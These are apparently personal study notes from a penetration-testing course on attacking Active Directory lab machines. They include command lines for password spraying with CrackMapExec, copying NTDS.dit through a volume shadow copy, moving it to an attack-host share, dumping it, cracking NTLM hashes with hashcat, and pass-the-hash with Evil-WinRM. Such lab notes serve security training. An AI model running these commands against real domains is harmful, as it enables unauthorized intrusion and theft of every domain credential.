Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`

Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01/nameofuser`) or with direct access to the device then typing `./` at the logon UI in the `Username` field.

study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).

## Dictionary Attacks against AD accounts using CrackMapExec

Many organizations follow a naming convention when creating employee usernames.

A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

#### Creating a Custom list of Usernames

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

#### Launching the Attack with CrackMapExec

attack against the target domain controller using a tool such as CrackMapExec

use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.

#### Event Logs from the Attack

navigate to `Event Viewer` and view the Security events to see the exact actions that were logged. This can inform decisions to implement stricter security controls and assist in any potential investigation that might be involved following a breach.

Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file.

---
## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources

Location: `%systemroot%/ntd`

The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html)

primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information

#### Connecting to a DC with Evil-WinRM

```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

connects using WinRm 

#### Checking Local Group Membership

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:


```shell-session
 net localgroup
```


To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights

#### Checking User Account Privileges including Domain

```shell-session
net user bwilliamson
```

#### Creating Shadow Copy of C:

 `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive

```shell-session
vssadmin CREATE SHADOW /For=C:
```
###### Note
We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.
#### Copying NTDS.dit from the VSS

```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### Transferring NTDS.dit to Attack Host

```shell-session
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### A Faster Method: Using cme to Capture NTDS.dit

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

--------

## Cracking Hashes & Gaining Credentials

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

What if we are unsuccessful in cracking a hash?
use PtH attacks

---

## Pass-the-Hash Considerations

A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`

#### Pass-the-Hash with Evil-WinRM Example

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```



